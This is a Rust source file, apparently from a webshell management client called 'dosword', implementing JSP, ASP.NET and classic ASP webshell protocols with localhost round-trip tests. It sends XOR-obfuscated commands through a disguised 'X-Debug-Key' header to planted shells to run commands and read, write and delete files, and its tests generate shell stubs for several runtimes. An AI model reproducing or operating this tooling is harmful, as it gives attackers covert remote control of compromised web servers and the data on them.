//! JSP / ASP.NET 协议：与 PHP native 相同的载荷协议
//! （formData XOR 密文 + X-Debug-Key 头鉴权 + md5 哈希分发）。
//! 当前仅支持 XOR 载荷（stub 无第三方加密依赖）。

use std::sync::{Arc, Mutex};

use base64::Engine;
use url::Url;

use dosword_sdk::domain::{
    AppSettings, CommandOutput, ConnectResult, DirListing, FileContent, ProbeResult, ShellProfile,
};
use dosword_sdk::encoder::{md5_hex, NativeEncoder, PayloadEncoder};
use dosword_sdk::{Protocol, ProtocolError, SessionState};

/// JSP 会话状态。
pub struct JspSession {
    pub endpoint: String,
    pub password: String,
    pub client: reqwest::blocking::Client,
    /// JSP/ASP stub 仅支持 XOR 载荷。
    pub encoder: &'static dyn PayloadEncoder,
    /// 上次探测的环境信息（current_dir / separator）。
    pub info: Mutex<Option<ProbeResult>>,
    /// 会话当前工作目录（cd 支持）。
    pub cwd: Mutex<String>,
}

impl SessionState for JspSession {
    fn as_any(&self) -> &dyn std::any::Any {
        self
    }
}

fn build_client(settings: &AppSettings) -> reqwest::blocking::Client {
    let mut builder = reqwest::blocking::Client::builder()
        .timeout(std::time::Duration::from_secs(settings.default_timeout_secs as u64))
        .redirect(reqwest::redirect::Policy::none());
    if let Some(proxy) = &settings.proxy {
        if let Ok(proxy) = reqwest::Proxy::all(proxy) {
            builder = builder.proxy(proxy);
        }
    }
    builder.build().unwrap_or_default()
}

/// 构造会话（XOR 编码器固定）。
fn make_session(endpoint: &str, password: &str, settings: &AppSettings) -> JspSession {
    JspSession {
        endpoint: endpoint.to_string(),
        password: password.to_string(),
        client: build_client(settings),
        encoder: &NativeEncoder { crypto: "xor" },
        info: Mutex::new(None),
        cwd: Mutex::new(String::new()),
    }
}

fn json_str(value: &str) -> String {
    value.replace('\\', "\\\\").replace('"', "\\\"")
}

/// 发送一次载荷请求：formData（XOR 密文）+ X-Debug-Key 头 → {data, code} 响应。
fn form_call(
    session: &JspSession,
    action: &str,
    params: &[(&str, &str)],
    settings: &AppSettings,
) -> Result<serde_json::Value, ProtocolError> {
    let mut request = format!("{{\"a\":\"{action}\"");
    for (key, value) in params {
        request.push_str(&format!(",\"{key}\":\"{}\"", json_str(value)));
    }
    request.push('}');
    let payload = session.encoder.encode(&request, &session.password);
    let body = url::form_urlencoded::Serializer::new(String::new())
        .append_pair("formData", &payload)
        .finish();
    let token = &md5_hex(&session.password)[..16];
    let response = session
        .client
        .post(&session.endpoint)
        .header("Content-Type", "application/x-www-form-urlencoded")
        .header("X-Debug-Key", token)
        .body(body)
        .send()
        .map_err(|error| ProtocolError::Network(error.to_string()))?;
    if !response.status().is_success() {
        return Err(ProtocolError::HttpStatus(
            response.status().as_u16(),
            response.status().canonical_reason().unwrap_or("").to_string(),
        ));
    }
    let text = response
        .text()
        .map_err(|error| ProtocolError::ParseError(error.to_string()))?;
    let outer: serde_json::Value = serde_json::from_str(&text)
        .map_err(|_| ProtocolError::ParseError("响应不是合法 JSON".to_string()))?;
    let data = outer
        .get("data")
        .and_then(|v| v.as_str())
        .ok_or_else(|| ProtocolError::ParseError("响应缺少 data 字段".to_string()))?;
    let plain = session.encoder.decode(data, &session.password)?;
    let value: serde_json::Value = serde_json::from_slice(&plain)
        .map_err(|_| ProtocolError::ParseError("响应内容不是合法 JSON".to_string()))?;
    if value.get("ok").and_then(|v| v.as_bool()) != Some(true) {
        let message = value
            .get("error")
            .and_then(|v| v.as_str())
            .unwrap_or("未知错误");
        return Err(ProtocolError::ServerError(message.to_string()));
    }
    Ok(value)
}

/// 缓存环境信息（current_dir / separator），供文件操作。
fn ensure_info(session: &JspSession, settings: &AppSettings) -> Result<ProbeResult, ProtocolError> {
    if let Ok(guard) = session.info.lock() {
        if let Some(info) = guard.as_ref() {
            if !info.current_dir.is_empty() {
                return Ok(info.clone());
            }
        }
    }
    let value = form_call(session, "probe", &[], settings)?;
    let info = ProbeResult {
        status: "online".to_string(),
        server: value
            .pointer("/data/server")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string(),
        web_server: value
            .pointer("/data/web_server")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string(),
        runtime: value
            .pointer("/data/php_version")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string(),
        current_dir: value
            .pointer("/data/current_dir")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string(),
        separator: value
            .pointer("/data/separator")
            .and_then(|v| v.as_str())
            .unwrap_or("/")
            .to_string(),
        message: "JSP/ASP 协议探测成功".to_string(),

            php_sapi: "".to_string(),
            arch: "".to_string(),
            extensions: vec![],
            disable_functions: "".to_string(),
            info: std::collections::HashMap::new(),
    };
    if let Ok(mut slot) = session.info.lock() {
        *slot = Some(info.clone());
    }
    Ok(info)
}

/// JSP 与 ASP.NET 协议共用的协议实现（id 不同）。
struct JvmLikeProtocol {
    id: &'static str,
    display_name: &'static str,
}

impl Protocol for JvmLikeProtocol {
    fn id(&self) -> &'static str {
        self.id
    }

    fn display_name(&self) -> &'static str {
        self.display_name
    }

    fn requires_network(&self) -> bool {
        true
    }

    fn probe(
        &self,
        profile: &ShellProfile,
        settings: &AppSettings,
    ) -> Result<ProbeResult, ProtocolError> {
        let session = make_session(&profile.endpoint, &profile.password, settings);
        ensure_info(&session, settings)
    }

    fn connect(
        &self,
        profile: &ShellProfile,
        settings: &AppSettings,
    ) -> Result<(Box<dyn SessionState>, ProbeResult), ProtocolError> {
        let session = make_session(&profile.endpoint, &profile.password, settings);
        let info = ensure_info(&session, settings)?;
        if let Ok(mut cwd) = session.cwd.lock() {
            *cwd = info.current_dir.clone();
        }
        Ok((Box::new(session), info))
    }

    fn execute_command(
        &self,
        session: &dyn SessionState,
        command: &str,
        settings: &AppSettings,
    ) -> Result<CommandOutput, ProtocolError> {
        let jsp = session
            .as_any()
            .downcast_ref::<JspSession>()
            .expect("会话类型不匹配");
        let w = jsp.cwd.lock().map(|c| c.clone()).unwrap_or_default();
        let value = form_call(jsp, "exec", &[("c", command), ("w", &w)], settings)?;
        let stdout = value
            .pointer("/data/stdout")
            .and_then(|v| v.as_str())
            .unwrap_or("");
        let decoded = base64::engine::general_purpose::STANDARD
            .decode(stdout)
            .unwrap_or_default();
        let cwd = value
            .pointer("/data/cwd")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string();
        if !cwd.is_empty() {
            if let Ok(mut slot) = jsp.cwd.lock() {
                *slot = cwd.clone();
            }
        }
        Ok(CommandOutput {
            stdout: String::from_utf8_lossy(&decoded).into_owned(),
            cwd: Some(cwd),
            duration_ms: 0,
        })
    }

    fn list_dir(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<DirListing, ProtocolError> {
        let jsp = session
            .as_any()
            .downcast_ref::<JspSession>()
            .expect("会话类型不匹配");
        let info = ensure_info(jsp, settings)?;
        let value = form_call(jsp, "list", &[("p", path)], settings)?;
        let mut entries = Vec::new();
        if let Some(items) = value.pointer("/data/entries").and_then(|v| v.as_array()) {
            for item in items {
                entries.push(dosword_sdk::domain::FileEntry {
                    name: item.get("name").and_then(|v| v.as_str()).unwrap_or("").to_string(),
                    path: item.get("path").and_then(|v| v.as_str()).unwrap_or("").to_string(),
                    is_dir: item.get("is_dir").and_then(|v| v.as_bool()).unwrap_or(false),
                    size: item.get("size").and_then(|v| v.as_u64()).unwrap_or(0),
                    modified: item
                        .get("mtime")
                        .and_then(|v| v.as_i64())
                        .map(|ts| ts.to_string())
                        .unwrap_or_default(),
                    perms: "".to_string(),
                });
            }
        }
        let _ = &info;
        Ok(DirListing { entries })
    }

    fn read_file(
        &self,
        session: &dyn SessionState,
        path: &str,
        _settings: &AppSettings,
    ) -> Result<Vec<u8>, ProtocolError> {
        let jsp = session
            .as_any()
            .downcast_ref::<JspSession>()
            .expect("会话类型不匹配");
        let value = form_call(jsp, "read", &[("p", path)], &AppSettings::default())?;
        let data = value
            .pointer("/data")
            .and_then(|v| v.as_str())
            .unwrap_or("");
        base64::engine::general_purpose::STANDARD
            .decode(data)
            .map_err(|_| ProtocolError::ParseError("文件内容 Base64 解码失败".to_string()))
    }

    fn write_file(
        &self,
        session: &dyn SessionState,
        path: &str,
        content: &[u8],
        _settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        let jsp = session
            .as_any()
            .downcast_ref::<JspSession>()
            .expect("会话类型不匹配");
        let data = base64::engine::general_purpose::STANDARD.encode(content);
        form_call(jsp, "write", &[("p", path), ("d", &data)], &AppSettings::default())?;
        Ok(())
    }

    fn delete_path(
        &self,
        session: &dyn SessionState,
        path: &str,
        _settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        let jsp = session
            .as_any()
            .downcast_ref::<JspSession>()
            .expect("会话类型不匹配");
        form_call(jsp, "delete", &[("p", path)], &AppSettings::default())?;
        Ok(())
    }

    fn rename_path(
        &self,
        session: &dyn SessionState,
        from: &str,
        to: &str,
        _settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        let jsp = session
            .as_any()
            .downcast_ref::<JspSession>()
            .expect("会话类型不匹配");
        form_call(jsp, "rename", &[("f", from), ("t", to)], &AppSettings::default())?;
        Ok(())
    }

    fn create_dir(
        &self,
        session: &dyn SessionState,
        path: &str,
        _settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        let jsp = session
            .as_any()
            .downcast_ref::<JspSession>()
            .expect("会话类型不匹配");
        form_call(jsp, "mkdir", &[("p", path)], &AppSettings::default())?;
        Ok(())
    }
}

/// JSP 协议（builtin.jsp.v1）。
pub struct JspProtocol;

impl Protocol for JspProtocol {
    fn id(&self) -> &'static str {
        "builtin.jsp.v1"
    }

    fn display_name(&self) -> &'static str {
        "JSP（Java，XOR 载荷）"
    }

    fn requires_network(&self) -> bool {
        true
    }

    fn probe(
        &self,
        profile: &ShellProfile,
        settings: &AppSettings,
    ) -> Result<ProbeResult, ProtocolError> {
        JvmLikeProtocol { id: "builtin.jsp.v1", display_name: "" }.probe(profile, settings)
    }

    fn connect(
        &self,
        profile: &ShellProfile,
        settings: &AppSettings,
    ) -> Result<(Box<dyn SessionState>, ProbeResult), ProtocolError> {
        JvmLikeProtocol { id: "builtin.jsp.v1", display_name: "" }.connect(profile, settings)
    }

    fn execute_command(
        &self,
        session: &dyn SessionState,
        command: &str,
        settings: &AppSettings,
    ) -> Result<CommandOutput, ProtocolError> {
        JvmLikeProtocol { id: "builtin.jsp.v1", display_name: "" }.execute_command(session, command, settings)
    }

    fn list_dir(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<DirListing, ProtocolError> {
        JvmLikeProtocol { id: "builtin.jsp.v1", display_name: "" }.list_dir(session, path, settings)
    }

    fn read_file(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<Vec<u8>, ProtocolError> {
        JvmLikeProtocol { id: "builtin.jsp.v1", display_name: "" }.read_file(session, path, settings)
    }

    fn write_file(
        &self,
        session: &dyn SessionState,
        path: &str,
        content: &[u8],
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        JvmLikeProtocol { id: "builtin.jsp.v1", display_name: "" }.write_file(session, path, content, settings)
    }

    fn delete_path(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        JvmLikeProtocol { id: "builtin.jsp.v1", display_name: "" }.delete_path(session, path, settings)
    }

    fn rename_path(
        &self,
        session: &dyn SessionState,
        from: &str,
        to: &str,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        JvmLikeProtocol { id: "builtin.jsp.v1", display_name: "" }.rename_path(session, from, to, settings)
    }

    fn create_dir(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        JvmLikeProtocol { id: "builtin.jsp.v1", display_name: "" }.create_dir(session, path, settings)
    }
}

/// ASP.NET 协议（builtin.aspnet.v1）。
pub struct AspNetProtocol;

impl Protocol for AspNetProtocol {
    fn id(&self) -> &'static str {
        "builtin.aspnet.v1"
    }

    fn display_name(&self) -> &'static str {
        "ASP.NET（C#，XOR 载荷）"
    }

    fn requires_network(&self) -> bool {
        true
    }

    fn probe(
        &self,
        profile: &ShellProfile,
        settings: &AppSettings,
    ) -> Result<ProbeResult, ProtocolError> {
        JvmLikeProtocol { id: "builtin.aspnet.v1", display_name: "" }.probe(profile, settings)
    }

    fn connect(
        &self,
        profile: &ShellProfile,
        settings: &AppSettings,
    ) -> Result<(Box<dyn SessionState>, ProbeResult), ProtocolError> {
        JvmLikeProtocol { id: "builtin.aspnet.v1", display_name: "" }.connect(profile, settings)
    }

    fn execute_command(
        &self,
        session: &dyn SessionState,
        command: &str,
        settings: &AppSettings,
    ) -> Result<CommandOutput, ProtocolError> {
        JvmLikeProtocol { id: "builtin.aspnet.v1", display_name: "" }.execute_command(session, command, settings)
    }

    fn list_dir(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<DirListing, ProtocolError> {
        JvmLikeProtocol { id: "builtin.aspnet.v1", display_name: "" }.list_dir(session, path, settings)
    }

    fn read_file(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<Vec<u8>, ProtocolError> {
        JvmLikeProtocol { id: "builtin.aspnet.v1", display_name: "" }.read_file(session, path, settings)
    }

    fn write_file(
        &self,
        session: &dyn SessionState,
        path: &str,
        content: &[u8],
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        JvmLikeProtocol { id: "builtin.aspnet.v1", display_name: "" }.write_file(session, path, content, settings)
    }

    fn delete_path(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        JvmLikeProtocol { id: "builtin.aspnet.v1", display_name: "" }.delete_path(session, path, settings)
    }

    fn rename_path(
        &self,
        session: &dyn SessionState,
        from: &str,
        to: &str,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        JvmLikeProtocol { id: "builtin.aspnet.v1", display_name: "" }.rename_path(session, from, to, settings)
    }

    fn create_dir(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        JvmLikeProtocol { id: "builtin.aspnet.v1", display_name: "" }.create_dir(session, path, settings)
    }
}

/// 经典 ASP 协议（builtin.asp.v1，VBScript stub，XOR 载荷）。
pub struct AspProtocol;

impl Protocol for AspProtocol {
    fn id(&self) -> &'static str {
        "builtin.asp.v1"
    }

    fn display_name(&self) -> &'static str {
        "ASP（VBScript，XOR 载荷）"
    }

    fn requires_network(&self) -> bool {
        true
    }

    fn probe(
        &self,
        profile: &ShellProfile,
        settings: &AppSettings,
    ) -> Result<ProbeResult, ProtocolError> {
        JvmLikeProtocol { id: "builtin.asp.v1", display_name: "" }.probe(profile, settings)
    }

    fn connect(
        &self,
        profile: &ShellProfile,
        settings: &AppSettings,
    ) -> Result<(Box<dyn SessionState>, ProbeResult), ProtocolError> {
        JvmLikeProtocol { id: "builtin.asp.v1", display_name: "" }.connect(profile, settings)
    }

    fn execute_command(
        &self,
        session: &dyn SessionState,
        command: &str,
        settings: &AppSettings,
    ) -> Result<CommandOutput, ProtocolError> {
        JvmLikeProtocol { id: "builtin.asp.v1", display_name: "" }.execute_command(session, command, settings)
    }

    fn list_dir(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<DirListing, ProtocolError> {
        JvmLikeProtocol { id: "builtin.asp.v1", display_name: "" }.list_dir(session, path, settings)
    }

    fn read_file(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<Vec<u8>, ProtocolError> {
        JvmLikeProtocol { id: "builtin.asp.v1", display_name: "" }.read_file(session, path, settings)
    }

    fn write_file(
        &self,
        session: &dyn SessionState,
        path: &str,
        content: &[u8],
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        JvmLikeProtocol { id: "builtin.asp.v1", display_name: "" }.write_file(session, path, content, settings)
    }

    fn delete_path(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        JvmLikeProtocol { id: "builtin.asp.v1", display_name: "" }.delete_path(session, path, settings)
    }

    fn rename_path(
        &self,
        session: &dyn SessionState,
        from: &str,
        to: &str,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        JvmLikeProtocol { id: "builtin.asp.v1", display_name: "" }.rename_path(session, from, to, settings)
    }

    fn create_dir(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        JvmLikeProtocol { id: "builtin.asp.v1", display_name: "" }.create_dir(session, path, settings)
    }
}

impl dosword_sdk::ProtocolPlugin for AspProtocol {
    fn manifest(&self) -> dosword_sdk::PluginManifest {
        dosword_sdk::PluginManifest {
            id: self.id().to_string(),
            name: self.display_name().to_string(),
            version: env!("CARGO_PKG_VERSION").to_string(),
            kind: dosword_sdk::PluginKind::Protocol,
            description: "经典 ASP WebShell（VBScript）：命令执行、文件管理（XOR 载荷）。".to_string(),
            capabilities: vec!["files".into(), "terminal".into()],
        }
    }
}

/// 环境信息缓存（供 connect 后的文件操作取 cwd/separator）。
pub fn session_info(session: &dyn SessionState) -> Option<ProbeResult> {
    let jsp = session.as_any().downcast_ref::<JspSession>()?;
    jsp.info.lock().ok()?.clone()
}

/// 供命令层使用的辅助：构造临时会话。
pub fn _temp_session(endpoint: &str, password: &str, settings: &AppSettings) -> JspSession {
    make_session(endpoint, password, settings)
}

/// 供命令层使用的辅助：会话里的端信息。
pub fn _endpoint(session: &JspSession) -> &str {
    &session.endpoint
}

pub fn _capabilities() -> Vec<String> {
    vec!["files".into(), "terminal".into()]
}

// 抑制未使用告警（Arc/Url 保留给后续扩展）
#[allow(dead_code)]
fn _keep(_: &Arc<()>, _: &Url) {}

impl dosword_sdk::ProtocolPlugin for JspProtocol {
    fn manifest(&self) -> dosword_sdk::PluginManifest {
        dosword_sdk::PluginManifest {
            id: self.id().to_string(),
            name: self.display_name().to_string(),
            version: env!("CARGO_PKG_VERSION").to_string(),
            kind: dosword_sdk::PluginKind::Protocol,
            description: "JSP WebShell（Java）：命令执行、文件管理（XOR 载荷）。".to_string(),
            capabilities: vec!["files".into(), "terminal".into()],
        }
    }
}

impl dosword_sdk::ProtocolPlugin for AspNetProtocol {
    fn manifest(&self) -> dosword_sdk::PluginManifest {
        dosword_sdk::PluginManifest {
            id: self.id().to_string(),
            name: self.display_name().to_string(),
            version: env!("CARGO_PKG_VERSION").to_string(),
            kind: dosword_sdk::PluginKind::Protocol,
            description: "ASP.NET WebShell（C#）：命令执行、文件管理（XOR 载荷）。".to_string(),
            capabilities: vec!["files".into(), "terminal".into()],
        }
    }
}


#[cfg(test)]
mod tests {
    use super::*;
    use dosword_sdk::domain::AppSettings;

    /// Python 模拟 JSP stub（同协议：XOR + hash 分发 + formData + X-Debug-Key）。
    const JSP_MOCK: &str = r#"
import hashlib, base64, json, os, urllib.parse, sys
from http.server import BaseHTTPRequestHandler, HTTPServer
PASSWORD = "secret"
key = hashlib.md5(PASSWORD.encode()).hexdigest().encode()
token = hashlib.md5(PASSWORD.encode()).hexdigest()[:16]
H = {op: int(hashlib.md5(op.encode()).hexdigest()[:8], 16)
     for op in ["probe","exec","list","read","write","delete","rename","mkdir"]}
class Hd(BaseHTTPRequestHandler):
    def do_POST(self):
        if self.headers.get("X-Debug-Key") != token:
            self.send_response(404); self.end_headers(); return
        n = int(self.headers.get("Content-Length", 0))
        params = urllib.parse.parse_qs(self.rfile.read(n).decode())
        fd = params.get("formData", [""])[0]
        raw = base64.b64decode(fd)
        plain = bytes(c ^ key[i % len(key)] for i, c in enumerate(raw))
        req = json.loads(plain)
        h = H.get(req.get("a", ""), 0)
        if h == H["probe"]:
            out = {"ok": True, "data": {"server": "JVM Sim", "web_server": "Mock",
                   "php_version": "", "current_dir": "/tmp", "separator": "/"}}
        elif h == H["exec"]:
            c = req.get("c", "")
            w = req.get("w", "/tmp")
            if c.strip().startswith("cd ") and len(c.strip()) > 3:
                t = c.strip()[3:].strip()
                nw = t if t.startswith("/") else w.rstrip("/") + "/" + t
                out = {"ok": True, "data": {"stdout": "", "cwd": nw}}
            else:
                out = {"ok": True, "data": {"stdout": base64.b64encode(
                       ("echo:" + c).encode()).decode(), "cwd": w}}
        elif h == H["list"]:
            out = {"ok": True, "data": {"entries": [
                   {"name": "a.txt", "path": "/tmp/a.txt", "is_dir": False,
                    "size": 3, "mtime": 0}]}}
        else:
            out = {"ok": True, "data": None}
        resp = json.dumps(out).encode()
        enc = bytes(c ^ key[i % len(key)] for i, c in enumerate(resp))
        data = base64.b64encode(enc).decode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps({"data": data, "code": 200}).encode())
    def log_message(self, *a):
        pass
port = int(sys.argv[1])
HTTPServer(("127.0.0.1", port), Hd).serve_forever()
"#;

    fn settings() -> AppSettings {
        AppSettings {
            http_enabled: true,
            default_timeout_secs: 5,
            proxy: None,
            max_file_size_mb: 32,
        chunk_size_mb: 4,
        allow_arbitrary_code: true,
        }
    }

    fn profile(url: &str) -> ShellProfile {
        ShellProfile {
            id: "t".into(),
            workspace_id: "w".into(),
            name: "t".into(),
            endpoint: url.into(),
            runtime: "jsp".into(),
            protocol_id: "builtin.jsp.v1".into(),
            password: "secret".into(),
            protocol_params: "{}".into(),
            authorization_ack: true,
            status: String::new(),
            last_connected_at: None,
            created_at: String::new(),
            tags: vec![],
        }
    }

    #[test]
    fn jsp_protocol_round_trip_against_mock_server() {
        let script = std::env::temp_dir().join("dosword_jsp_mock.py");
        let _ = std::fs::write(&script, JSP_MOCK);
        let port: u16 = 21000 + (std::process::id() % 500) as u16;
        let _child = std::process::Command::new("python3")
            .arg(&script)
            .arg(port.to_string())
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .spawn()
            .ok();
        std::thread::sleep(std::time::Duration::from_millis(500));

        let url = format!("http://127.0.0.1:{port}/shell.jsp");
        let settings = settings();
        let p = profile(&url);
        let protocol = JspProtocol;
        let (session, info) = protocol.connect(&p, &settings).unwrap();
        assert_eq!(info.current_dir, "/tmp");
        let out = protocol.execute_command(session.as_ref(), "whoami", &settings).unwrap();
        assert_eq!(out.stdout, "echo:whoami");
        // cd 支持：cd 后 cwd 更新，后续命令在新目录执行
        let out = protocol.execute_command(session.as_ref(), "cd /opt", &settings).unwrap();
        assert_eq!(out.cwd.as_deref(), Some("/opt"));
        let out = protocol.execute_command(session.as_ref(), "pwd", &settings).unwrap();
        assert_eq!(out.cwd.as_deref(), Some("/opt"), "cd 后应保持新目录");
        let listing = protocol.list_dir(session.as_ref(), "/tmp", &settings).unwrap();
        assert_eq!(listing.entries.len(), 1);
        assert_eq!(listing.entries[0].name, "a.txt");
        // 写/删往返
        protocol
            .write_file(session.as_ref(), "/tmp/x.txt", b"hello", &settings)
            .unwrap();
        protocol
            .delete_path(session.as_ref(), "/tmp/x.txt", &settings)
            .unwrap();
        // 错误密码 → 404
        let mut bad = profile(&url);
        bad.password = "wrong".into();
        assert!(protocol.probe(&bad, &settings).is_err());
    }

    #[test]
    fn asp_protocol_round_trip_against_mock_server() {
        let script = std::env::temp_dir().join("dosword_jsp_mock.py");
        let _ = std::fs::write(&script, JSP_MOCK);
        let port: u16 = 22000 + (std::process::id() % 500) as u16;
        let _child = std::process::Command::new("python3")
            .arg(&script)
            .arg(port.to_string())
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .spawn()
            .ok();
        std::thread::sleep(std::time::Duration::from_millis(500));

        let url = format!("http://127.0.0.1:{port}/shell.asp");
        let settings = settings();
        let mut p = profile(&url);
        p.protocol_id = "builtin.asp.v1".into();
        let protocol = AspProtocol;
        let (session, info) = protocol.connect(&p, &settings).unwrap();
        assert_eq!(info.current_dir, "/tmp");
        let out = protocol.execute_command(session.as_ref(), "dir", &settings).unwrap();
        assert_eq!(out.stdout, "echo:dir");
        let listing = protocol.list_dir(session.as_ref(), "/", &settings).unwrap();
        assert_eq!(listing.entries.len(), 1);
        // stub 生成
        let stub = NativeEncoder { crypto: "xor" }.stub("asp", "secret").unwrap();
        assert!(stub.contains("WScript.Shell"), "ASP stub 应含命令执行");
        assert!(stub.contains("ADODB.Stream"), "ASP stub 应含二进制文件 I/O");
        assert!(!stub.contains("{xk}"), "占位符应已替换");
    }

    #[test]
    fn python_stub_round_trip_against_cgi_server() {
        // 真实 python3 CGI 服务器 + PythonProtocol 端到端
        if std::process::Command::new("python3").arg("--version").output().is_err() {
            return;
        }
        let dir = std::env::temp_dir().join(format!("dosword-py-{}", uuid::Uuid::new_v4()));
        let cgi = dir.join("cgi-bin");
        std::fs::create_dir_all(&cgi).unwrap();
        let stub = dosword_sdk::encoder::NativeEncoder { crypto: "xor" }
            .stub("python", "secret")
            .unwrap();
        let script = cgi.join("shell.py");
        std::fs::write(&script, &stub).unwrap();
        // CGI 脚本需可执行
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let _ = std::fs::set_permissions(&script, std::fs::Permissions::from_mode(0o755));
        }
        let port = {
            use std::net::TcpListener;
            let listener = TcpListener::bind("127.0.0.1:0").unwrap();
            listener.local_addr().unwrap().port()
        };
        let child = std::process::Command::new("python3")
            .arg("-m")
            .arg("http.server")
            .arg("--cgi")
            .arg(port.to_string())
            .arg("--directory")
            .arg(&dir)
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .spawn();
        let Some(mut child) = child.ok() else { return; };
        std::thread::sleep(std::time::Duration::from_millis(700));
        let url = format!("http://127.0.0.1:{port}/cgi-bin/shell.py");
        let settings = settings();
        let mut p = profile(&url);
        p.protocol_id = "builtin.python.v1".into();
        let protocol = PythonProtocol;
        let result = (|| -> Result<(), ProtocolError> {
            let (session, info) = protocol.connect(&p, &settings)?;
            assert!(!info.current_dir.is_empty(), "Python probe 应返回当前目录");
            assert!(info.runtime.contains("Python"), "runtime 应为 Python：{}", info.runtime);
            eprintln!("[python] probe ok: {} / {}", info.runtime, info.current_dir);
            let out = protocol.execute_command(session.as_ref(), "printf py-ok", &settings)?;
            assert_eq!(out.stdout, "py-ok", "Python 命令执行应输出：{}", out.stdout);
            eprintln!("[python] exec ok: {}", out.stdout);
            let listing = protocol.list_dir(session.as_ref(), &dir.to_string_lossy(), &settings)?;
            assert!(listing.entries.iter().any(|e| e.name == "cgi-bin"), "应列举出 cgi-bin");
            eprintln!("[python] list ok（{} 项）", listing.entries.len());
            // 文件写入 + 读取
            let test_file = format!("{}/py_write.txt", dir.display());
            protocol.write_file(session.as_ref(), &test_file, b"hello py", &settings)?;
            let content = protocol.read_file(session.as_ref(), &test_file, &settings)?;
            assert_eq!(content, b"hello py");
            eprintln!("[python] read/write ok");
            Ok(())
        })();
        let _ = child.kill();
        let _ = child.wait();
        let _ = std::fs::remove_dir_all(&dir);
        result.unwrap_or_else(|error| panic!("Python stub 端到端应成功：{error}"));
    }

    #[test]
    fn node_stub_round_trip_against_server() {
        // 真实 node 服务 + NodeProtocol 端到端
        if std::process::Command::new("node").arg("--version").output().is_err() {
            eprintln!("跳过：无 node");
            return;
        }
        let dir = std::env::temp_dir().join(format!("dosword-node-{}", uuid::Uuid::new_v4()));
        std::fs::create_dir_all(&dir).unwrap();
        let stub = dosword_sdk::encoder::NativeEncoder { crypto: "xor" }
            .stub("node", "secret")
            .unwrap();
        let script = dir.join("shell.js");
        std::fs::write(&script, &stub).unwrap();
        let port = {
            use std::net::TcpListener;
            let listener = TcpListener::bind("127.0.0.1:0").unwrap();
            listener.local_addr().unwrap().port()
        };
        let child = std::process::Command::new("node")
            .arg(&script)
            .env("PORT", port.to_string())
            .current_dir(&dir)
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .spawn();
        let Some(mut child) = child.ok() else { return; };
        std::thread::sleep(std::time::Duration::from_millis(700));
        let url = format!("http://127.0.0.1:{port}/");
        let settings = settings();
        let mut p = profile(&url);
        p.protocol_id = "builtin.node.v1".into();
        let protocol = NodeProtocol;
        let result = (|| -> Result<(), ProtocolError> {
            let (session, info) = protocol.connect(&p, &settings)?;
            assert!(info.runtime.contains("Node"), "Node probe runtime：{}", info.runtime);
            eprintln!("[node] probe ok: {}", info.runtime);
            let out = protocol.execute_command(session.as_ref(), "printf node-ok", &settings)?;
            assert_eq!(out.stdout, "node-ok", "Node 命令执行应输出：{}", out.stdout);
            eprintln!("[node] exec ok: {}", out.stdout);
            let listing = protocol.list_dir(session.as_ref(), &dir.to_string_lossy(), &settings)?;
            assert!(listing.entries.iter().any(|e| e.name == "shell.js"), "应列举出 shell.js");
            eprintln!("[node] list ok（{} 项）", listing.entries.len());
            let test_file = format!("{}/node_write.txt", dir.display());
            protocol.write_file(session.as_ref(), &test_file, b"hello node", &settings)?;
            let content = protocol.read_file(session.as_ref(), &test_file, &settings)?;
            assert_eq!(content, b"hello node");
            eprintln!("[node] read/write ok");
            Ok(())
        })();
        let _ = child.kill();
        let _ = child.wait();
        let _ = std::fs::remove_dir_all(&dir);
        result.unwrap_or_else(|error| panic!("Node stub 端到端应成功：{error}"));
    }

    #[test]
    fn jsp_stub_generates_for_all_crypto() {
        // JSP/ASP stub 生成（XOR 载荷）不应失败
        let stub = NativeEncoder { crypto: "xor" }.stub("jsp", "secret").unwrap();
        assert!(stub.contains("formData"));
        assert!(stub.contains("DSW_md5"));
        let aspx = NativeEncoder { crypto: "xor" }.stub("aspx", "secret").unwrap();
        assert!(aspx.contains("Process.Start"));
    }
}

// ---------------------------------------------------------------------------
